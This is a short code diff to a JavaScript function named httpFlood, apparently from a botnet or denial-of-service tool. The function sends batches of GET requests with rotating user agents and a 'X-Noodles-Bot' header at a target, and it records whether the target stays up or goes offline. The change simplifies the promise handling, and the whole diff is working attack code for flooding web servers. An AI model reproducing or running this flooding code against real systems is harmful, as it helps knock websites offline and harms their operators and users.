@@ -33,8 +33,7 @@ async function httpFlood(target, duration, intensity) {
         const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
         const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Noodles-Bot: Active\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n`;
 
-        const promise = new Promise(resolve => {
-          fetch(target, {
+        const promise = fetch(target, {
             method: 'GET',
             headers: {
               'User-Agent': userAgent,
@@ -51,13 +50,10 @@ async function httpFlood(target, duration, intensity) {
             } else {
               targetStatus = 'Unresponsive';
             }
-            resolve();
           })
           .catch(error => {
             targetStatus = 'Offline';
-            resolve();
           });
-        });
         promises.push(promise);
       }
       await Promise.all(promises);
